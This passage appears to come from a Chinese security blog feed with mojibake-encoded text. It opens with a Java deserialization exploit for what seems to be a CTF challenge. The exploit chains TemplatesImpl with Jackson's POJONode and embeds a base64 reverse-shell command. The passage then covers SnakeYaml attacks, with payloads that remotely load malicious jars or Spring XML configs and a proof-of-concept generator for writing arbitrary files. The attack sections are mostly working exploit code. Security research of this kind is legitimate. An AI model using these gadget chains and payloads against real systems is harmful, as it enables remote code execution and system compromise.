com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtMethod;<br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.security.ProtectionDomain;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">jsonNode</span> <span class="hljs-operator">=</span> pool.get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);<br>            <span class="hljs-type">CtMethod</span> <span class="hljs-variable">writeReplace</span> <span class="hljs-operator">=</span> jsonNode.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>            jsonNode.removeMethod(writeReplace);<br>            <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader();<br>            jsonNode.toClass(classLoader, (ProtectionDomain)<span class="hljs-literal">null</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var11) &#123;<br>        &#125;<br><br>        <span class="hljs-type">byte</span>[] code = getTemplates();<span class="hljs-comment">//ç”¨javassistè·å–</span><br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;xxx&quot;</span>);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>,  <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, codes);<br><br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(templates);<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br><br>        setFieldValue(val, <span class="hljs-string">&quot;val&quot;</span>, node);<br><br>        System.out.println(serial(val));<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serial</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> IOException, NoSuchFieldException &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(o);<br>        oos.close();<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">base64String</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());<br>        <span class="hljs-keyword">return</span> base64String;<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] getTemplates() <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">template</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;MyTemplate&quot;</span>);<br>        template.setSuperclass(pool.get(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>));<br>        <span class="hljs-type">String</span> <span class="hljs-variable">block</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;bash -c &#123;echo,&lt;base64åå¼¹shell&gt;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;);&quot;</span>;<br>        template.makeClassInitializer().insertBefore(block);<br>        <span class="hljs-keyword">return</span> template.toBytecode();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String field, Object val)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">dField</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(field);<br>        dField.setAccessible(<span class="hljs-literal">true</span>);<br>        dField.set(obj, val);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ‰“ä¸€æ¬¡hackå³å¯ï¼Œå› ä¸ºååºåˆ—åŒ–å·²ç»æˆåŠŸï¼š</p><p><img src="/2024/08/03/%E4%BB%8E%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22023Baby-URL%E7%9C%8B%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8CJackson%E5%8E%9F%E7%94%9F%E9%93%BE/image-20240803211441966.png" alt="image-20240803211441966"></p><p><img src="/2024/08/03/%E4%BB%8E%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22023Baby-URL%E7%9C%8B%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8CJackson%E5%8E%9F%E7%94%9F%E9%93%BE/image-20240803211445638.png" alt="image-20240803211445638"></p><p>äºŒæ¬¡ååºåˆ—åŒ–çš„ç ”ç©¶æˆ‘ä¼šåç»­å†å•å¼€ä¸€ä¸ªæ–‡ç« ï¼Œå› ä¸ºä¹Ÿéå¸¸å…·æœ‰ç ”ç©¶ä»·å€¼ã€‚å¯çœ‹<a href="https://xz.aliyun.com/t/13900?time__1311=GqmxnD2D97itqGNDQieBK4rci1LnEbD">æµ…è°ˆJavaäºŒæ¬¡ååºåˆ—åŒ– - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SnakeYaml</title>
    <link href="/2024/08/03/SnakeYaml/"/>
    <url>/2024/08/03/SnakeYaml/</url>
    
    <content type="html"><![CDATA[<p>SnakeYamlä¹Ÿç®—æ˜¯å¸¸è§çš„åŒ…ï¼Œåœ¨ä¹‹å‰æ‰“é¢˜çš„æ—¶å€™é‡åˆ°è¿‡ï¼Œå›½å†³javaé¢˜ä¸¤é“solonä¹Ÿæœ‰è¿™ä¸ªåŒ…ã€‚</p><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>SnakeYamlæ˜¯ä¸€ä¸ªå®Œæ•´çš„YAML1.1è§„èŒƒProcessorï¼Œç”¨äºè§£æYAMLï¼Œåºåˆ—åŒ–ä»¥åŠååºåˆ—åŒ–ï¼Œæ”¯æŒUTF-8&#x2F;UTF-16ï¼Œæ”¯æŒJavaå¯¹è±¡çš„åºåˆ—åŒ–&#x2F;ååºåˆ—åŒ–ï¼Œæ”¯æŒæ‰€æœ‰YAMLå®šä¹‰çš„ç±»å‹ã€‚</p><h2 id="Basic-Practice"><a href="#Basic-Practice" class="headerlink" title="Basic Practice"></a>Basic Practice</h2><p>ä¾èµ–å¦‚ä¸‹ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.yaml<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>snakeyaml<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.27<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ä¸¤ä¸ªæ–¹æ³•ï¼š</p><ul><li>Yaml.load()ï¼šå…¥å‚æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²æˆ–è€…ä¸€ä¸ªæ–‡ä»¶ï¼Œè¿”å›ä¸€ä¸ªJavaå¯¹è±¡</li><li>Yaml.dump()ï¼šå°†ä¸€ä¸ªå¯¹è±¡è½¬åŒ–ä¸ºyamlæ–‡ä»¶å½¢å¼</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.snake.demo;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">User</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">User</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Non Arg Constructor&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getName&quot;</span>);<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setName&quot;</span>);<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getAge&quot;</span>);<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setAge&quot;</span>);<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;I am &quot;</span> + name + <span class="hljs-string">&quot;, &quot;</span> + age + <span class="hljs-string">&quot; years old&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="dump"><a href="#dump" class="headerlink" title="dump"></a>dump</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;taco&quot;</span>, <span class="hljs-number">18</span>);<br><span class="hljs-type">Yaml</span> <span class="hljs-variable">yaml</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Yaml</span>();<br>System.out.println(yaml.dump(user));<br></code></pre></td></tr></table></figure><blockquote><p>æ‰“å°ç»“æœ:</p><p>getName</p><p>!!com.snake.demo.User {age: 18, name: taco}</p></blockquote><p><strong>!!ç”¨äºå¼ºåˆ¶ç±»å‹è½¬æ¢ï¼Œä¸fastjsonä¸­@typeå­—æ®µç±»ä¼¼</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">dump()è¿˜è°ƒç”¨äº†é<span class="hljs-keyword">public</span>æˆå‘˜çš„getter<br></code></pre></td></tr></table></figure><h3 id="load"><a href="#load" class="headerlink" title="load"></a>load</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;!!com.snake.demo.User &#123;age: 18, name: taco&#125;&quot;</span>;<br><span class="hljs-type">Yaml</span> <span class="hljs-variable">yaml</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Yaml</span>();<br><span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> yaml.load(s);<br>System.out.println(user);<br></code></pre></td></tr></table></figure><blockquote><p>Non Arg Constructor</p><p>setName</p><p>I am taco, 18 years old</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">load()è°ƒç”¨äº†æ— å‚æ„é€ å™¨å’Œé<span class="hljs-keyword">public</span>æˆå‘˜çš„setter<br></code></pre></td></tr></table></figure><p>å®é™…ä¸Šä¸ä»…æ— å‚æ„é€ å™¨èƒ½å¤Ÿè°ƒç”¨ï¼Œè¿˜èƒ½æŒ‡å®šè°ƒç”¨æœ‰å‚æ„é€ å™¨ï¼Œåªè¦ä¼ å‚ç±»å‹ä¸ºæœ‰å‚æ„é€ å™¨çš„å‚æ•°ç±»å‹å³å¯ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;!!com.snake.demo.User [\&quot;taco\&quot;, 18]&quot;</span>;<br><span class="hljs-type">Yaml</span> <span class="hljs-variable">yaml</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Yaml</span>();<br><span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> yaml.load(s);<br>System.out.println(user);<br></code></pre></td></tr></table></figure><blockquote><p>Arg Constructor Called</p><p>I am taco, 18 years old</p></blockquote><p>æ­¤æ—¶å°±ä¸ä¼šè°ƒç”¨<code>setter</code>æ–¹æ³•äº†</p><blockquote><p>è‹¥ç±»å±æ€§æ˜¯publicä¿®é¥°ï¼Œä¸ä¼šè°ƒç”¨å¯¹åº”çš„setteræ–¹æ³•ï¼Œè€Œæ˜¯é€šè¿‡åå°„æ¥set</p></blockquote><h2 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h2><p>yamlååºåˆ—åŒ–æ—¶é€šè¿‡<code>!!</code> + å…¨ç±»åæŒ‡å®šååºåˆ—åŒ–çš„ç±»ï¼Œå’Œfastjsonä¸€æ ·éƒ½ä¼šè°ƒç”¨setterï¼Œä¸è¿‡å¯¹äºpublicä¿®é¥°çš„æˆå‘˜ä¸ä¼šè°ƒç”¨å…¶setterï¼Œé™¤æ­¤ä¹‹å¤–ï¼Œsnakeyamlååºåˆ—åŒ–æ—¶è¿˜èƒ½è°ƒç”¨è¯¥ç±»çš„æ„é€ å‡½æ•°ï¼ˆfastjsonæ˜¯é€šè¿‡ASMç”Ÿæˆçš„ï¼‰ã€‚</p><h3 id="ScriptEngineManager"><a href="#ScriptEngineManager" class="headerlink" title="ScriptEngineManager"></a>ScriptEngineManager</h3><p>æ„é€ <code>ScriptEngineManager</code>payloadï¼Œåˆ©ç”¨SPIæœºåˆ¶é€šè¿‡<code>URLClassLoader</code>è¿œç¨‹åŠ è½½æ¶æ„å­—èŠ‚ç æ–‡ä»¶ã€‚</p><p>Githubä¸Šé¢çš„EXPï¼š<a href="https://github.com/artsploit/yaml-payload">https://github.com/artsploit/yaml-payload</a></p><p>å·¥å…·çš„å·¥ç¨‹classpathä¸‹å­˜åœ¨<code>META-INF/services</code>æ–‡ä»¶å¤¹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">javax.script.ScriptEngineFactory<br></code></pre></td></tr></table></figure><blockquote><p>artsploit.AwesomeScriptEngineFactory</p></blockquote><p>æ‰“æˆjaråŒ…</p><blockquote><p>javac src&#x2F;artsploit&#x2F;AwesomeScriptEngineFactory.java</p><p>jar -cvf yaml-payload.jar -C src&#x2F; .</p></blockquote><p>å°†ç”Ÿæˆyaml-payload.jaråŒ…æ”¾åœ¨webæœåŠ¡ä¸Š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -m http.server 9999<br></code></pre></td></tr></table></figure><blockquote><p>!!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL [â€œ<a href="http://127.0.0.1:9999/yaml-payload.jar%22]">http://127.0.0.1:9999/yaml-payload.jar&quot;]</a> ]] ]</p></blockquote><p><img src="/2024/08/03/SnakeYaml/image-20240803154021356.png" alt="image-20240803154021356"></p><p>è§¦å‘æµç¨‹å¦‚ä¸‹ï¼š</p><p><code>javax.script.ScriptEngineManager</code></p><p><img src="/2024/08/03/SnakeYaml/image-20240803154059167.png" alt="image-20240803154059167"></p><p><img src="/2024/08/03/SnakeYaml/image-20240803154133518.png" alt="image-20240803154133518"></p><p><code>ScriptEngineManager</code>çš„æ— å‚æ„é€ å™¨è°ƒç”¨äº†init()ï¼Œè¿›è¡Œåˆå§‹åŒ–è®¾ç½®åè°ƒç”¨<code>initEngines()</code>ï¼Œç”¨äºåˆå§‹åŒ–è„šæœ¬å¼•æ“ã€‚</p><p>æ¥ç€åˆ°<code>getServiceLoader</code>ï¼Œç”¨äºè·å–<code>ServiceLoader</code>è¿­ä»£å™¨</p><p><img src="/2024/08/03/SnakeYaml/image-20240803154442837.png" alt="image-20240803154442837"></p><p>åˆ°äº†ç†Ÿæ‚‰çš„<code>ServiceLoader.load()</code>è¿”å›ä¸€ä¸ª<code>ServiceLoader&lt;T&gt;</code>ï¼Œæ ¹æ®è¿™ä¸ªå¯ä»¥è·å–ä¸€ä¸ªè¿­ä»£å™¨ï¼Œæ¥ä¸‹æ¥è¿˜æ˜¯ç†Ÿæ‚‰çš„è¿­ä»£éå†ã€‚</p><p><img src="/2024/08/03/SnakeYaml/image-20240803154716142.png" alt="image-20240803154716142"></p><p><code>next() =&gt; nextService()</code>ä¼šåŠ è½½æ¥å£å®ç°ç±»å¹¶å®ä¾‹åŒ–ï¼Œç½‘ä¸Šæœ‰è¯¦è§£ã€‚</p><h3 id="SpringFrameworkè¿œç¨‹åŠ è½½é…ç½®"><a href="#SpringFrameworkè¿œç¨‹åŠ è½½é…ç½®" class="headerlink" title="SpringFrameworkè¿œç¨‹åŠ è½½é…ç½®"></a>SpringFrameworkè¿œç¨‹åŠ è½½é…ç½®</h3><p>Springå½“ä¸­æœ‰ä¸¤ä¸ªç±»çš„æ„é€ å‡½æ•°è¿œç¨‹åŠ è½½é…ç½®ï¼Œå¯ä»¥æ„æˆRCE</p><blockquote><p>org.springframework.context.support.ClassPathXmlApplicationContext org.springframework.context.support.FileSystemXmlApplicationContext</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="hljs-tag">       <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">       <span class="hljs-attr">xmlns:p</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/p&quot;</span></span><br><span class="hljs-tag">       <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans</span></span><br><span class="hljs-string"><span class="hljs-tag">        http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;exec&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="hljs-attr">init-method</span>=<span class="hljs-string">&quot;start&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">list</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>calc<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>          <span class="hljs-tag">&lt;/<span class="hljs-name">list</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">constructor-arg</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>!!org.springframework.context.support.ClassPathXmlApplicationContext [â€œ<a href="http://127.0.0.1:8888/evil.xml%22]">http://127.0.0.1:8888/evil.xml&quot;]</a></p></blockquote><p>æ—¢ç„¶èƒ½è§¦å‘getterï¼Œé‚£ä¹ˆfastjsonçš„å¤§éƒ¨åˆ†payloadä¹Ÿå¯ä»¥ç”¨ã€‚</p><h3 id="å†™æ–‡ä»¶åŠ è½½æœ¬åœ°jar"><a href="#å†™æ–‡ä»¶åŠ è½½æœ¬åœ°jar" class="headerlink" title="å†™æ–‡ä»¶åŠ è½½æœ¬åœ°jar"></a>å†™æ–‡ä»¶åŠ è½½æœ¬åœ°jar</h3><blockquote><p>!!sun.rmi.server.MarshalOutputStream [!!java.util.zip.InflaterOutputStream [!!java.io.FileOutputStream [!!java.io.File [â€œfilePathâ€],false],!!java.util.zip.Inflater { input: !!binary base64 },length]]</p></blockquote><p>filepathæ˜¯å†™å…¥è·¯å¾„ï¼Œbase64strä¸ºç»è¿‡zlibå‹ç¼©è¿‡åçš„æ–‡ä»¶å†…å®¹,lengthä¸ºæ–‡ä»¶å¤§å°</p><p>å’Œfastjsonä¸€æ ·ï¼Œå¯¹äºbyteæ•°ç»„ä¼šè‡ªåŠ¨è¿›è¡Œbase64è§£ç (snakeyamlä¸­ä¸ºbinary)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.security.utils.JavaUtils;<br><span class="hljs-keyword">import</span> org.yaml.snakeyaml.Yaml;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.zip.Deflater;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SnakeYamlFilePOC</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">poc</span> <span class="hljs-operator">=</span> createPoc(<span class="hljs-string">&quot;E:/flag.txt&quot;</span>, <span class="hljs-string">&quot;E:/a.txt&quot;</span>);<br>        System.out.println(poc);<br><span class="hljs-comment">//        Yaml yaml = new Yaml();</span><br><span class="hljs-comment">//        yaml.load(poc);</span><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">createPoc</span><span class="hljs-params">(String src, String path)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">byte</span>[] file = JavaUtils.getBytesFromFile(src);<br>        <span class="hljs-type">int</span> <span class="hljs-variable">length</span> <span class="hljs-operator">=</span> file.length;<br>        <span class="hljs-type">byte</span>[] compressed = compress(file);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">b64</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(compressed);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;!!sun.rmi.server.MarshalOutputStream &quot;</span> +<br>                <span class="hljs-string">&quot;[!!java.util.zip.InflaterOutputStream [&quot;</span> +<br>                    <span class="hljs-string">&quot;!!java.io.FileOutputStream [&quot;</span> +<br>                        <span class="hljs-string">&quot;!!java.io.File [\&quot;&quot;</span> + path + <span class="hljs-string">&quot;\&quot;],false],&quot;</span> +<br>                        <span class="hljs-string">&quot;!!java.util.zip.Inflater  &#123; input: !!binary &quot;</span> + b64 + <span class="hljs-string">&quot; &#125;, &quot;</span> + length +<br>                        <span class="hljs-string">&quot;]]&quot;</span>;<br>        <span class="hljs-keyword">return</span> payload;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] compress(<span class="hljs-type">byte</span>[] input) <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">Deflater</span> <span class="hljs-variable">deflater</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Deflater</span>();<br>        deflater.setInput(input);<br>        deflater.finish();<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br><br>        <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>        <span class="hljs-keyword">while</span> (!deflater.finished()) &#123;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">compressedSize</span> <span 